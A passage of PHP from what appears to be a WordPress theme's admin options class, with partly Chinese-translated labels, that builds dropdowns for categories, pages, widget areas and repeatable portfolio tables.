			echo '<option '.$s2.' value="page">页面</option>';
			echo '<option '.$s3.' value="widget">小工具</option>';
					
			echo '</select><br/>';
			
			// 3 different dropdowns:
			
			//categories
			$s1 = $s2 = $s3 = '';
			if ($this->database_options[$values['id'].$i.'_content'] != "post") $s1 = "hidden";
			
			echo '<span class="selected_post '.$s1.'">';
			echo '<select class="postform" id="'.$values['id'].$i.'_content_post" name="'.$values['id'].$i.'_content_post">'; 
			echo '<option value="">Select post category</option>';
			
			$categories = get_categories('title_li=&orderby=name&hide_empty=0');
			foreach ($categories as $category)
			{
				
				if ($this->database_options[$values['id'].$i.'_content_post'] == $category->term_id)
				{
					$selected = "selected='selected'";	
				}
				else
				{
					$selected = "";		
				}
				
				echo "<option $selected value='". $category->term_id."'>". $category->name."</option>";
			}
			echo '</select> <br/></span>';
			
			//pages
			if ($this->database_options[$values['id'].$i.'_content'] != "page") $s2 = "hidden";	
			echo '<span class="selected_page '.$s2.'">';
			echo '<select class="postform" id="'.$values['id'].$i.'_content_page" name="'.$values['id'].$i.'_content_page">'; 
			echo '<option value="">选择页面/option>';		
			
			$pages = get_pages('title_li=&orderby=name');
			foreach ($pages as $page)
			{
				if ($this->database_options[$values['id'].$i.'_content_page'] == $page->ID)
				{
					$selected = "selected='selected'";	
				}
				else
				{
					$selected = "";		
				}
				
				echo "<option $selected value='". $page->ID."'>". $page->post_title."</option>";
			}
			echo '</select> <br/></span>';
	
			//widgets
			if ($this->database_options[$values['id'].$i.'_content'] != "widget") $s3 = "hidden";	
			
			echo '<span class="selected_widget '.$s3.'">';
			echo 'Please save this page, then head over to the <a href="widgets.php">widget page</a> and add widgets to the <a href="widgets.php">"'.$values['widget'].' '.$i.' Widget Area"</a>';
			echo '</div><br/>';
				
		    echo '<br/>';
		    echo '<input type="hidden" name="'.$values['id'].'" value="'.$values['count'].'"';
			echo '</td></tr>';
		
		}
	}

	##############################################################
	# PORTFOLIO 投资组合？ 尚未知道用处
	##############################################################	
	function portfolio($values)
	{
		echo "<div class='multitables'>";
		
		if ($this->database_options['super_matrix_count'] == "")
		{
			$this->database_options['super_matrix_count'] = 1;
		}
		
		echo '<input name="super_matrix_count" class="super_matrix_count" type="hidden" value="'.$this->database_options['super_matrix_count'].'" />';
		$count = $this->database_options['super_matrix_count'] + 1;
		
		for($z = 0; $z < $count; $z++)
		{	
			$last = '';
			if ($z+1 == $count) $last = 'hidden clone_me';
			
			echo '<table class="widefat kriesi_options multitable '.$last.'">';
			echo '<thead><tr><th>';
			
			if ($z != 0)
			{
				echo '<a href="#" class="del_table" id="del_number_'.($z + 1).'" >Delete this Portfolio</a>';
			} 
			
			echo '</th><th>&nbsp;</th></tr></thead><tbody>';
			echo '<tr valign="top">';
			echo '<th scope="row"> Portfolio Page <span class="changenumber">'.($z+1).'</span></th>';
			echo '<td>Select a Page to display Portfolio <span class="changenumber">'.($z+1).'</span> <br/>';
			
			echo '<select class="postform" id="matrix_page_slider_port_'.$z.'" name="matrix_page_slider_port_'.$z.'">';
			echo '<option value="">选择页面</option>';
			
			$pages = get_pages('title_li=&orderby=name');
			foreach ($pages as $page)
			{
				if ($this->database_options['matrix_page_slider_port_'.$z] == $page->ID && $z+1 != $count)
				{
					$selected = "selected='selected'";	
				}
				else
				{
					$selected = "";		
				}
				
				echo "<option $selected value='". $page->ID."'>". $page->post_title."</option>";
			}
			
			echo '</select><br/><br/>';
			echo 'Select Categories to display in Portfolio <span class="changenumber">'.($z+1).'</span> <br/>';
			echo '<div class="multiple_box">';
			echo '<noscript>ATTENTION: JAVASCRIPT IS DISABLED, THIS CAN BREAK THE MULTIPLE CATEGORY OPTION<br/></noscript>';
		
			
			if(($this->database_options['matrix_slider_port_'.$z.'_hidden'] == "" 
			|| $this->database_options['matrix_slider_port_'.$z.'_hidden'] == false 
			|| $z+1 == $count))
				{
					$this->database_options['matrix_slider_port_'.$z.'_hidden'] = 1;
				}
				
			for($i = 0; $i < $this->database_options['matrix_slider_port_'.$z.'_hidden']; $i++)
			{ 
			
			echo '<select class="postform multiply_me" id="matrix_slider_port_'.$z.'_'.$i.'" name="matrix_slider_port_'.$z.'_'.$i.'">';
			echo '<option value="">Select additional category?</option>';
			 
			$categories = get_categories('title_li=&orderby=name&hide_empty=0');
			foreach ($categories as $category){
				
				if ($this->database_options['matrix_slider_port_'.$z.'_'.$i] == $category->term_id && $z+1 != $count)
				{
					$selected = "selected='selected'";	
				}
				else
				{
					$selected = "";		
				}
				echo "<option $selected value='". $category->term_id."'>". $category->name."</option>";
			}
			
			echo '</select>';
			    
			    
			} 
			echo '<input name="matrix_slider_port_'.$z.'_hidden" class="matrix_slider_port_'.$z.'_hidden" ';
			echo 'type="hidden" value="'.$this->database_options['matrix_slider_port_'.$z.'_hidden'].'" />';
			echo '</div><br/></td></tr></tbody>';
			
			echo '<tfoot><tr><th><a href="#" class="add_table" id="number_'.($z+1).'" >Add another Portfolio</a></th><th>&nbsp;</th></tr></tfoot>';
			echo '</table>';
			} 
			
			echo '</div>'; // end multitables
	}



##################################################################
} # end class
##################################################################


